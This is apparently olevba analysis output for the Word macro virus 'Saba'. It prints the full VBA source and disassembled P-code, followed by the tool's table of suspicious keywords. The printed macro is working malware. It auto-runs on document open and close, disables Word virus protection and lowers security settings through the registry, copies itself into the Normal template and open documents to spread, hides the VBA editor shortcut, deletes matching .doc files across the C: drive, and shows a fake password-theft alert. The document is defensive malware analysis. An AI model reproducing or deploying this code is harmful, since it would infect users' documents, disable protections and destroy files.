olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Saba
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Saba - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO sabath.bas 
in file: Virus.MSWord.Saba - OLE stream: 'Macros/VBA/sabath'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'SABatH means S.tealth A.rtificial Bat.tle...
'Sabath? ñîáñòâåííî óæå çäåñü!
'Sabath in each txt file...soon!!!
'Sabath is searching for you
'Harmless Sabath macro virii
'SABATH Ver 4.1 or later
'Mafia together again !!!
'Trying to be closer with SABATHy?
'Sabath is only the end of the begining
'Any suggestions? Send them to AVP.ru
'Ñåññèÿ - âðàã ñòóäåíòà!!!
'Áîëüøå ìàêðîñîâ îïàñíûõ è ðàçíûõ!
'Äëÿ óäàëåíèÿ ýòîãî ìàêðîñà íóæíî ïåðåçàãðóçèòü êîìïüþòåð ïðÿìî ñåé÷àñ!!!
'Ïðèâåò îò çëîáíîãî õàêåðà, âîîáùå-òî ýòî íàäîëãî...




Sub AboutVirii()
'MicrosoftSafetyMacros
'ver.4.14
'antiToolBarOn function added
'finished at 15:40 (15 May 2001)

End Sub


Sub ViewVBCode()
  On Error Resume Next
   Call antitoolbar
   Call sabath
   
End Sub
Sub sabath()
    
    
On Error Resume Next

Options.ConfirmConversions = False
Options.VirusProtection = False
VirusProtection = False
aSec = "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security"
System.PrivateProfileString(FileName:="", Section:=aSec, Key:="Level") = "1"

Options.SaveNormalPrompt = False
ActiveDocument.VBProject.VBComponents("sabath").Export "c:\sabath.drv"
ActiveDocument.ReadOnlyRecommended = False
NormalTemplate.VBProject.VBComponents("sabath").Export "c:\sabath.drv"
chislo = Int(Rnd * 100)

    If chislo = 99 Then MsgBox "Ïðèâåò VicodinES îò _\` /4 |3 /4 + |-|", vbSystemModal



If NormalTemplate.VBProject.VBComponents.Item("sabath").Name <> "sabath" Then TemplateNameCheck = True
If ActiveDocument.VBProject.VBComponents.Item("sabath").Name <> "sabath" Then ActiveDocNameCheck = True
If TemplateNameCheck = True And ActiveDocNameCheck = False Then Set VIRIIconst = NormalTemplate.VBProject.VBComponents
If TemplateNameCheck = False And ActiveDocNameCheck = True Then Set VIRIIconst = ActiveDocument.VBProject.VBComponents
VIRIIconst.import "c:\sabath.drv"
If ActiveDocNameCheck = False Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
If ActiveDocNameCheck = False Then If NormalTemplate.Saved = False Then NormalTemplate.Save
Rem MsgBox "   _\` /4 |3 /4 + |-| tribute to VicodinES "
IDontKnowWhatItWas:
End Sub
Sub xHelpAbout()
   On Error Resume Next

  MsgBox " _\` /4 |3 /4 + |-|  ", vbInformation

 Call sabath
 End Sub

Sub AutoOpen()
    On Error Resume Next
    VirusProtection = False
aSec = "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security"
System.PrivateProfileString(FileName:="", Section:=aSec, Key:="Level") = "1"
    
ShowVisualBasicEditor = False
   KeyBindings.Add KeyCode:=BuildKeyCode(wdKeyAlt, wdKeyF11), KeyCategory:=wdKeyCategoryCommand, Command:="FileClose"
    Call sabath

End Sub
Sub ToolsMacro()
    On Error Resume Next
    Call sabath
End Sub


Sub Tooday()
    On Error Resume Next
        Selection.HomeKey Unit:=wdStory
        Selection.Find.ClearFormatting
        Selection.Find.Replacement.ClearFormatting
        With Selection.Find
            .Text = " îí "
            .Replacement.Text = " _\` /4 |3 /4 + |-| "
            .Forward = True
            .Wrap = wdFindContinue
            .Format = False
            .MatchCase = False
            .MatchWholeWord = False
            .MatchAllWordForms = True
        End With
        

        Selection.Find.Execute Replace:=wdReplaceAll
      
If ActiveDocument.Saved = False Then ActiveDocument.Save
End Sub

Sub FileTemplates()
    On Error Resume Next
    Call sabath
End Sub
Sub autoclose()
On Error Resume Next
VirusProtection = False
Call sabath
aSec = "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security"
System.PrivateProfileString(FileName:="", Section:=aSec, Key:="Level") = "1"
If Day(Now()) = Month(Now()) Then
MsgBox "Fatal Error #303. Passwords were stolen some days ago by dangerous hacker! Have a nice internet!", vbSystemModal
Else
End If
If Day(Now()) > 30 Then
Call ShowMess
Else
End If
ActiveDocument.Save
Kill "c:\sabath.drv"
StatusBar = "Get Ur NEW AVir TODAY!!! _\` A |3 A T |-|"

End Sub
Rem  Thanx to VicodinES, CyberShadow[SMF], Spooky, STEALTH group, GVG (Generic Virus Group)[still not member]
Rem  CodeBreakers, AVP-encyclopedia (very interesting and amazing reading)
Rem  comming soon SABATH site (not www.sabath.fbi.org)
Rem Lookin for ???.vxd everywere on Ur PC (in Ver 05)
Rem getting Name & sys-info and loging it for...(in Ver 05.2)
Rem  mp3 song inside... (in Ver 5.?m )
Rem findMeOut-algorithm hiding macro different ways (in Ver 06)
Rem no Few patches will be avaible on SaBat#.#####.ru

Private Sub ShowMess()
On Error Resume Next
If Left(Application.Version, 1) = "8" Then
  ShVer8
Else
End If
End Sub
Private Sub ShVer8()
 On Error Resume Next
 Assistant.Visible = True
 Dim bln As Balloon
 Set bln = Assistant.NewBalloon
 With bln
  .Mode = msoModeAutoDown
  .Heading = GetMess
  .Animation = Int(Rnd * (117))
  .Button = msoButtonSetNextClose
  
End Sub

Private Function GetMess()
On Error Resume Next
GetMess = Mid(ActiveDocument.VBProject.VBComponents.Item("sabath").CodeModule.Lines(Int(Rnd * ActiveDocument.VBProject.VBComponents.Item("sabath").CodeModule.CountOfDeclarationLines) + 1, 1), 2)
End Function

Sub antitoolbar()
'after my toolbarOn get popularized...
'...every target get it!!! Itz waz pitty!
' And I decide to "Fix thiz Bug"... right now! May,10 - 2001 year
'(no parts taken from MacroFAQ by CyberShadow)
On Error Resume Next

Application.DisplayAlerts = wdAlertsNone
'Íèêàêèõ îøèáîê íå ïîêàçûâàåò!!!
Options.VirusProtection = False
'Âûêëþ÷àåò çàùèòó îò âèðóñîâ è çàïóñê àâòî-ôóíêöèé.
Set fs = Application.FileSearch
With fs
    .LookIn = "C:\"
    .SearchSubFolders = True
    .FileName = "toolbaron*.doc"
    If .Execute() > 0 Then
    
    For i = 1 To .FoundFiles.Count
        FileName$ = .FoundFiles(i)
        Kill FileName$
Next i
End If
End With

End Sub


-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Saba
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 1190 bytes
' Macros/VBA/sabath - 16073 bytes
' Line #0:
' 	QuoteRem 0x0000 0x002C "SABatH means S.tealth A.rtificial Bat.tle..."
' Line #1:
' 	QuoteRem 0x0000 0x001D "Sabath? ñîáñòâåííî óæå çäåñü!"
' Line #2:
' 	QuoteRem 0x0000 0x0021 "Sabath in each txt file...soon!!!"
' Line #3:
' 	QuoteRem 0x0000 0x001B "Sabath is searching for you"
' Line #4:
' 	QuoteRem 0x0000 0x001B "Harmless Sabath macro virii"
' Line #5:
' 	QuoteRem 0x0000 0x0017 "SABATH Ver 4.1 or later"
' Line #6:
' 	QuoteRem 0x0000 0x0018 "Mafia together again !!!"
' Line #7:
' 	QuoteRem 0x0000 0x0021 "Trying to be closer with SABATHy?"
' Line #8:
' 	QuoteRem 0x0000 0x0026 "Sabath is only the end of the begining"
' Line #9:
' 	QuoteRem 0x0000 0x0024 "Any suggestions? Send them to AVP.ru"
' Line #10:
' 	QuoteRem 0x0000 0x0019 "Ñåññèÿ - âðàã ñòóäåíòà!!!"
' Line #11:
' 	QuoteRem 0x0000 0x0021 "Áîëüøå ìàêðîñîâ îïàñíûõ è ðàçíûõ!"
' Line #12:
' 	QuoteRem 0x0000 0x0048 "Äëÿ óäàëåíèÿ ýòîãî ìàêðîñà íóæíî ïåðåçàãðóçèòü êîìïüþòåð ïðÿìî ñåé÷àñ!!!"
' Line #13:
' 	QuoteRem 0x0000 0x0033 "Ïðèâåò îò çëîáíîãî õàêåðà, âîîáùå-òî ýòî íàäîëãî..."
' Line #14:
' Line #15:
' Line #16:
' Line #17:
' Line #18:
' 	FuncDefn (Sub AboutVirii())
' Line #19:
' 	QuoteRem 0x0000 0x0015 "MicrosoftSafetyMacros"
' Line #20:
' 	QuoteRem 0x0000 0x0008 "ver.4.14"
' Line #21:
' 	QuoteRem 0x0000 0x001C "antiToolBarOn function added"
' Line #22:
' 	QuoteRem 0x0000 0x001F "finished at 15:40 (15 May 2001)"
' Line #23:
' Line #24:
' 	EndSub 
' Line #25:
' Line #26:
' Line #27:
' 	FuncDefn (Sub ViewVBCode())
' Line #28:
' 	OnError (Resume Next) 
' Line #29:
' 	ArgsCall (Call) antitoolbar 0x0000 
' Line #30:
' 	ArgsCall (Call) sabath 0x0000 
' Line #31:
' Line #32:
' 	EndSub 
' Line #33:
' 	FuncDefn (Sub sabath())
' Line #34:
' Line #35:
' Line #36:
' 	OnError (Resume Next) 
' Line #37:
' Line #38:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #39:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #40:
' 	LitVarSpecial (False)
' 	St VirusProtection 
' Line #41:
' 	LitStr 0x003D "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security"
' 	St aSec 
' Line #42:
' 	LitStr 0x0001 "1"
' 	LitStr 0x0000 ""
' 	ParamNamed FileName 
' 	Ld aSec 
' 	ParamNamed Section 
' 	LitStr 0x0005 "Level"
' 	ParamNamed Key 
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #43:
' Line #44:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #45:
' 	LitStr 0x000D "c:\sabath.drv"
' 	LitStr 0x0006 "sabath"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #46:
' 	LitVarSpecial (False)
' 	Ld ActiveDocument 
' 	MemSt ReadOnlyRecommended 
' Line #47:
' 	LitStr 0x000D "c:\sabath.drv"
' 	LitStr 0x0006 "sabath"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #48:
' 	Ld Rnd 
' 	LitDI2 0x0064 
' 	Mul 
' 	FnInt 
' 	St chislo 
' Line #49:
' Line #50:
' 	Ld chislo 
' 	LitDI2 0x0063 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0026 "Ïðèâåò VicodinES îò _\` /4 |3 /4 + |-|"
' 	Ld vbSystemModal 
' 	ArgsCall MsgBox 0x0002 
' 	EndIf 
' Line #51:
' Line #52:
' Line #53:
' Line #54:
' 	LitStr 0x0006 "sabath"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd New 
' 	LitStr 0x0006 "sabath"
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St TemplateNameCheck 
' 	EndIf 
' Line #55:
' 	LitStr 0x0006 "sabath"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd New 
' 	LitStr 0x0006 "sabath"
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St ActiveDocNameCheck 
' 	EndIf 
' Line #56:
' 	Ld TemplateNameCheck 
' 	LitVarSpecial (True)
' 	Eq 
' 	Ld ActiveDocNameCheck 
' 	LitVarSpecial (False)
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	SetStmt 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	Set VIRIIconst 
' 	EndIf 
' Line #57:
' 	Ld TemplateNameCheck 
' 	LitVarSpecial (False)
' 	Eq 
' 	Ld ActiveDocNameCheck 
' 	LitVarSpecial (True)
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	SetStmt 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	Set VIRIIconst 
' 	EndIf 
' Line #58:
' 	LitStr 0x000D "c:\sabath.drv"
' 	Ld VIRIIconst 
' 	ArgsMemCall import 0x0001 
' Line #59:
' 	Ld ActiveDocNameCheck 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld wdFormatDocument 
' 	ParamNamed FileFormat 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0002 
' 	EndIf 
' Line #60:
' 	Ld ActiveDocNameCheck 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld NormalTemplate 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' 	EndIf 
' Line #61:
' 	Rem 0x0035 " MsgBox "   _\` /4 |3 /4 + |-| tribute to VicodinES ""
' Line #62:
' 	Label IDontKnowWhatItWas 
' Line #63:
' 	EndSub 
' Line #64:
' 	FuncDefn (Sub xHelpAbout())
' Line #65:
' 	OnError (Resume Next) 
' Line #66:
' Line #67:
' 	LitStr 0x0015 " _\` /4 |3 /4 + |-|  "
' 	Ld vbInformation 
' 	ArgsCall MsgBox 0x0002 
' Line #68:
' Line #69:
' 	ArgsCall (Call) sabath 0x0000 
' Line #70:
' 	EndSub 
' Line #71:
' Line #72:
' 	FuncDefn (Sub AutoOpen())
' Line #73:
' 	OnError (Resume Next) 
' Line #74:
' 	LitVarSpecial (False)
' 	St VirusProtection 
' Line #75:
' 	LitStr 0x003D "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security"
' 	St aSec 
' Line #76:
' 	LitStr 0x0001 "1"
' 	LitStr 0x0000 ""
' 	ParamNamed FileName 
' 	Ld aSec 
' 	ParamNamed Section 
' 	LitStr 0x0005 "Level"
' 	ParamNamed Key 
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #77:
' Line #78:
' 	LitVarSpecial (False)
' 	St ShowVisualBasicEditor 
' Line #79:
' 	Ld wdKeyAlt 
' 	Ld wdKeyF11 
' 	ArgsLd BuildKeyCode 0x0002 
' 	ParamNamed KeyCode 
' 	Ld wdKeyCategoryCommand 
' 	ParamNamed KeyCategory 
' 	LitStr 0x0009 "FileClose"
' 	ParamNamed Command 
' 	Ld KeyBindings 
' 	ArgsMemCall Add 0x0003 
' Line #80:
' 	ArgsCall (Call) sabath 0x0000 
' Line #81:
' Line #82:
' 	EndSub 
' Line #83:
' 	FuncDefn (Sub ToolsMacro())
' Line #84:
' 	OnError (Resume Next) 
' Line #85:
' 	ArgsCall (Call) sabath 0x0000 
' Line #86:
' 	EndSub 
' Line #87:
' Line #88:
' Line #89:
' 	FuncDefn (Sub Tooday())
' Line #90:
' 	OnError (Resume Next) 
' Line #91:
' 	Ld wdStory 
' 	ParamNamed Unit 
' 	Ld Selection 
' 	ArgsMemCall HomeKey 0x0001 
' Line #92:
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall ClearFormatting 0x0000 
' Line #93:
' 	Ld Selection 
' 	MemLd Find 
' 	MemLd Replacement 
' 	ArgsMemCall ClearFormatting 0x0000 
' Line #94:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Find 
' 	With 
' Line #95:
' 	LitStr 0x0004 " îí "
' 	MemStWith Then 
' Line #96:
' 	LitStr 0x0014 " _\` /4 |3 /4 + |-| "
' 	MemLdWith Replacement 
' 	MemSt Then 
' Line #97:
' 	LitVarSpecial (True)
' 	MemStWith Forward 
' Line #98:
' 	Ld wdFindContinue 
' 	MemStWith Wrap 
' Line #99:
' 	LitVarSpecial (False)
' 	MemStWith Format$ 
' Line #100:
' 	LitVarSpecial (False)
' 	MemStWith MatchCase 
' Line #101:
' 	LitVarSpecial (False)
' 	MemStWith MatchWholeWord 
' Line #102:
' 	LitVarSpecial (True)
' 	MemStWith MatchAllWordForms 
' Line #103:
' 	EndWith 
' Line #104:
' Line #105:
' Line #106:
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall Execute 0x0001 
' Line #107:
' Line #108:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #109:
' 	EndSub 
' Line #110:
' Line #111:
' 	FuncDefn (Sub FileTemplates())
' Line #112:
' 	OnError (Resume Next) 
' Line #113:
' 	ArgsCall (Call) sabath 0x0000 
' Line #114:
' 	EndSub 
' Line #115:
' 	FuncDefn (Sub autoclose())
' Line #116:
' 	OnError (Resume Next) 
' Line #117:
' 	LitVarSpecial (False)
' 	St VirusProtection 
' Line #118:
' 	ArgsCall (Call) sabath 0x0000 
' Line #119:
' 	LitStr 0x003D "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security"
' 	St aSec 
' Line #120:
' 	LitStr 0x0001 "1"
' 	LitStr 0x0000 ""
' 	ParamNamed FileName 
' 	Ld aSec 
' 	ParamNamed Section 
' 	LitStr 0x0005 "Level"
' 	ParamNamed Key 
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #121:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	ArgsLd Now 0x0000 
' 	ArgsLd Month 0x0001 
' 	Eq 
' 	IfBlock 
' Line #122:
' 	LitStr 0x0060 "Fatal Error #303. Passwords were stolen some days ago by dangerous hacker! Have a nice internet!"
' 	Ld vbSystemModal 
' 	ArgsCall MsgBox 0x0002 
' Line #123:
' 	ElseBlock 
' Line #124:
' 	EndIfBlock 
' Line #125:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x001E 
' 	Gt 
' 	IfBlock 
' Line #126:
' 	ArgsCall (Call) ShowMess 0x0000 
' Line #127:
' 	ElseBlock 
' Line #128:
' 	EndIfBlock 
' Line #129:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #130:
' 	LitStr 0x000D "c:\sabath.drv"
' 	ArgsCall Kill 0x0001 
' Line #131:
' 	LitStr 0x0029 "Get Ur NEW AVir TODAY!!! _\` A |3 A T |-|"
' 	St StatusBar 
' Line #132:
' Line #133:
' 	EndSub 
' Line #134:
' 	Rem 0x006A "  Thanx to VicodinES, CyberShadow[SMF], Spooky, STEALTH group, GVG (Generic Virus Group)[still not member]"
' Line #135:
' 	Rem 0x0047 "  CodeBreakers, AVP-encyclopedia (very interesting and amazing reading)"
' Line #136:
' 	Rem 0x0033 "  comming soon SABATH site (not www.sabath.fbi.org)"
' Line #137:
' 	Rem 0x0032 " Lookin for ???.vxd everywere on Ur PC (in Ver 05)"
' Line #138:
' 	Rem 0x003A " getting Name & sys-info and loging it for...(in Ver 05.2)"
' Line #139:
' 	Rem 0x0023 "  mp3 song inside... (in Ver 5.?m )"
' Line #140:
' 	Rem 0x003C " findMeOut-algorithm hiding macro different ways (in Ver 06)"
' Line #141:
' 	Rem 0x0032 " no Few patches will be avaible on SaBat#.#####.ru"
' Line #142:
' Line #143:
' 	FuncDefn (Private Sub ShowMess())
' Line #144:
' 	OnError (Resume Next) 
' Line #145:
' 	Ld Application 
' 	MemLd Version 
' 	LitDI2 0x0001 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0001 "8"
' 	Eq 
' 	IfBlock 
' Line #146:
' 	ArgsCall ShVer8 0x0000 
' Line #147:
' 	ElseBlock 
' Line #148:
' 	EndIfBlock 
' Line #149:
' 	EndSub 
' Line #150:
' 	FuncDefn (Private Sub ShVer8())
' Line #151:
' 	OnError (Resume Next) 
' Line #152:
' 	LitVarSpecial (True)
' 	Ld Assistant 
' 	MemSt Visible 
' Line #153:
' 	Dim 
' 	VarDefn bln
' Line #154:
' 	SetStmt 
' 	Ld Assistant 
' 	MemLd NewBalloon 
' 	Set bln 
' Line #155:
' 	StartWithExpr 
' 	Ld bln 
' 	With 
' Line #156:
' 	Ld msoModeAutoDown 
' 	MemStWith Mode 
' Line #157:
' 	Ld GetMess 
' 	MemStWith Heading 
' Line #158:
' 	Ld Rnd 
' 	LitDI2 0x0075 
' 	Paren 
' 	Mul 
' 	FnInt 
' 	MemStWith Animation 
' Line #159:
' 	Ld msoButtonSetNextClose 
' 	MemStWith Button 
' Line #160:
' Line #161:
' 	EndSub 
' Line #162:
' Line #163:
' 	FuncDefn (Private Function GetMess())
' Line #164:
' 	OnError (Resume Next) 
' Line #165:
' 	Ld Rnd 
' 	LitStr 0x0006 "sabath"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfDeclarationLines 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	LitDI2 0x0001 
' 	LitStr 0x0006 "sabath"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x0002 
' 	ArgsLd Mid$ 0x0002 
' 	St GetMess 
' Line #166:
' 	EndFunc 
' Line #167:
' Line #168:
' 	FuncDefn (Sub antitoolbar())
' Line #169:
' 	QuoteRem 0x0000 0x0025 "after my toolbarOn get popularized..."
' Line #170:
' 	QuoteRem 0x0000 0x0028 "...every target get it!!! Itz waz pitty!"
' Line #171:
' 	QuoteRem 0x0000 0x0040 " And I decide to "Fix thiz Bug"... right now! May,10 - 2001 year"
' Line #172:
' 	QuoteRem 0x0000 0x002D "(no parts taken from MacroFAQ by CyberShadow)"
' Line #173:
' 	OnError (Resume Next) 
' Line #174:
' Line #175:
' 	Ld wdAlertsNone 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #176:
' 	QuoteRem 0x0000 0x001F "Íèêàêèõ îøèáîê íå ïîêàçûâàåò!!!"
' Line #177:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #178:
' 	QuoteRem 0x0000 0x0032 "Âûêëþ÷àåò çàùèòó îò âèðóñîâ è çàïóñê àâòî-ôóíêöèé."
' Line #179:
' 	SetStmt 
' 	Ld Application 
' 	MemLd FileSearch 
' 	Set fs 
' Line #180:
' 	StartWithExpr 
' 	Ld fs 
' 	With 
' Line #181:
' 	LitStr 0x0003 "C:\"
' 	MemStWith LookIn 
' Line #182:
' 	LitVarSpecial (True)
' 	MemStWith SearchSubFolders 
' Line #183:
' 	LitStr 0x000E "toolbaron*.doc"
' 	MemStWith FileName 
' Line #184:
' 	ArgsMemLdWith Execute 0x0000 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #185:
' Line #186:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	MemLdWith FoundFiles 
' 	MemLd Count 
' 	For 
' Line #187:
' 	Ld i 
' 	ArgsMemLdWith FoundFiles 0x0001 
' 	St FileName$ 
' Line #188:
' 	Ld FileName$ 
' 	ArgsCall Kill 0x0001 
' Line #189:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #190:
' 	EndIfBlock 
' Line #191:
' 	EndWith 
' Line #192:
' Line #193:
' 	EndSub 
' Line #194:
' Line #195:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |autoclose           |Runs when the Word document is closed        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Command             |May run PowerShell commands                  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

